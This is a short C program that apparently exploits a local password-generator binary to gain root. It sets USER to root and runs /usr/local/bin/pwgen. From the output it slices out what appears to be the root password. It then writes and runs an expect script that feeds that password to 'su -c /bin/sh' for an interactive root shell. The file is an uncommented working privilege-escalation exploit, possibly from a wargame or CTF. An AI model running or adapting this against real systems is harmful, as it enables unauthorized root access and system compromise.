#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char const *argv[])
{
	char *passwd = NULL;
	char *real = NULL;
	int size =30;
	FILE *script;
	FILE *code;
	
	real = malloc(sizeof(char)*9);
	setenv("USER","root",1);

	system("/usr/local/bin/pwgen -w > code");
	code = fopen("code","r");
	if(code == NULL){
		printf("Error opening code file\n");
		exit(1);
	}

	getline(&passwd,&size,code);
	strncpy(real,passwd+20,8);
	
	script = fopen("script","w");
	if(script == NULL){
		printf("Error opeing script file!\n");
		exit(1);
	}
	fprintf(script, "#!/usr/bin/expect\n");
	fprintf(script, "spawn su -c /bin/sh\n");
	fprintf(script, "expect \"Password: \"\n");
	fprintf(script, "send ");
	fprintf(script, "\"");
	fprintf(script, "%s",real);
	fprintf(script, "\\r");
	fprintf(script, "\"");
	fprintf(script, "\n");
	fprintf(script, "interact\n");
	fclose(script);
	system("rm code");
	system("expect script");
	exit(0);
}